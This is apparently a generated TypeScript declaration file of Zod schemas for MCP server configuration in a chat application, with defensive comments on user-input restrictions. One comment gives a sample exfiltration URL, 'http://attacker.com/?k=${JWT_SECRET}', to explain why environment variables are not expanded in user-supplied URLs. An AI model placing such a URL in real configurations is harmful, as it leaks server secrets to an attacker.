    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}, {
    type: "streamable-http" | "http";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}>]>>;
export type MCPOptions = z.infer<typeof MCPOptionsSchema>;
/**
 * MCP Server configuration that comes from UI/API input only.
 * Omits server-managed fields like startup, timeout, customUserVars, etc.
 * Allows: title, description, url, iconPath, oauth (user credentials).
 * Admin-only OAuth audience fields are rejected for user-managed servers.
 *
 * SECURITY: Stdio transport is intentionally excluded from user input.
 * Stdio allows arbitrary command execution and should only be configured
 * by administrators via the YAML config file (librechat.yaml).
 * Only remote transports (SSE, HTTP, WebSocket) are allowed via the API.
 *
 * SECURITY: URL fields use userUrlSchema instead of the admin schemas'
 * extractEnvVariable transform to prevent env variable exfiltration
 * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
 * Protocol checks use positive allowlists (http(s) / ws(s)) to block
 * file://, ftp://, javascript:, and other non-network schemes.
 */
export declare const MCPServerUserInputSchema: z.ZodUnion<[z.ZodObject<{
    [x: string]: z.ZodTypeAny;
    [x: number]: z.ZodTypeAny;
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        client_id: z.ZodOptional<z.ZodString>;
        client_secret: z.ZodOptional<z.ZodString>;
        scope: z.ZodOptional<z.ZodString>;
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    } & {
        authorization_url: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        token_url: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        redirect_uri: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        revocation_endpoint: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        audience: z.ZodOptional<z.ZodNever>;
        forward_audience_on_refresh: z.ZodOptional<z.ZodNever>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
} & {
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, z.UnknownKeysParam, z.ZodTypeAny, {
    [x: string]: any;
    [x: number]: any;
    oauth?: unknown;
    url?: unknown;
}, {
    [x: string]: any;
    [x: number]: any;
    oauth?: unknown;
    url?: unknown;
}>, z.ZodObject<{
    [x: string]: z.ZodTypeAny;
    [x: number]: z.ZodTypeAny;
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        client_id: z.ZodOptional<z.ZodString>;
        client_secret: z.ZodOptional<z.ZodString>;
        scope: z.ZodOptional<z.ZodString>;
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    } & {
        authorization_url: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        token_url: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        redirect_uri: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        revocation_endpoint: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        audience: z.ZodOptional<z.ZodNever>;
        forward_audience_on_refresh: z.ZodOptional<z.ZodNever>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
} & {
    proxy: z.ZodOptional<z.ZodNever>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, z.UnknownKeysParam, z.ZodTypeAny, {
    [x: string]: any;
    [x: number]: any;
    oauth?: unknown;
    proxy?: unknown;
    url?: unknown;
}, {
    [x: string]: any;
    [x: number]: any;
    oauth?: unknown;
    proxy?: unknown;
    url?: unknown;
}>, z.ZodObject<{
    [x: string]: z.ZodTypeAny;
    [x: number]: z.ZodTypeAny;
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        client_id: z.ZodOptional<z.ZodString>;
        client_secret: z.ZodOptional<z.ZodString>;
        scope: z.ZodOptional<z.ZodString>;
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    } & {
        authorization_url: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        token_url: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        redirect_uri: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        revocation_endpoint: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
        audience: z.ZodOptional<z.ZodNever>;
        forward_audience_on_refresh: z.ZodOptional<z.ZodNever>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: undefined;
        forward_audience_on_refresh?: undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
} & {
    proxy: z.ZodOptional<z.ZodNever>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, z.UnknownKeysParam, z.ZodTypeAny, {
    [x: string]: any;
    [x: number]: any;
    oauth?: unknown;
    proxy?: unknown;
    url?: unknown;
}, {
    [x: string]: any;
    [x: number]: any;
    oauth?: unknown;
    proxy?: unknown;
    url?: unknown;
}>]>;
export type MCPServerUserInput = z.infer<typeof MCPServerUserInputSchema>;
/**
 * Set of every field name that may appear in a user-submitted MCP server config,
 * derived from `MCPServerUserInputSchema`'s union members. Used as the comparison
 * surface for the OBO lockdown check in `updateMCPServerController` so that
 * server-managed fields on the existing config (`dbId`, `source`, `author`,
 * `requiresOAuth`, `oauthMetadata`, etc.) don't show up as differences and
 * cause spurious 403s on legitimate saves.
 *
 * Schema-derived rather than hand-maintained: when a new field is added to
 * `BaseOptionsSchema` or any transport variant, it flows into this set
 * automatically. The OBO lockdown then locks the new field by default
 * (since it won't be in the hand-curated `OBO_USER_EDITABLE_FIELDS`
 * allowlist), preventing a silent privilege regression.
 */
export declare const MCP_USER_INPUT_FIELDS: ReadonlySet<string>;
